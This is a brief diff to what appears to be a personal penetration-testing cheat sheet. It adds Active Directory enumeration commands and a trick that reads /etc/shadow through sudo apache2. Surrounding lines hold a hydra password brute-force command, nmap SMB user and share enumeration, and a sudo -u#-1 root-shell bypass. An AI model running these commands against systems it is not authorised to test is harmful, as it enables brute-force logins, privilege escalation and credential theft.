@@ -44,6 +44,10 @@ hydra -l USERNAME -P /usr/share/wordlists/rockyou.txt IP_ADDRESS -t THREAD_COUNT
 
 Enumeration
 
+#Active Directory
+gpresult /r (get domain controller computer is getting group policy from)
+Set Logonserver
+
 #Nmap
 nmap -sn ADDRESSRANGE
 nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse MACHINE_IP
@@ -94,6 +98,7 @@ https://gtfobins.github.io
 #Linux
 sudo -l
 sudo -u#-1 /bin/bash (if ALL in output of above command and sudo 1.8.27 or prior)
+sudo apache2 -f /etc/shadow (reads first line if apache2 runs as sudo)
 hostname
 cat /proc/version OR /etc/issue
 ps axjf (process tree)
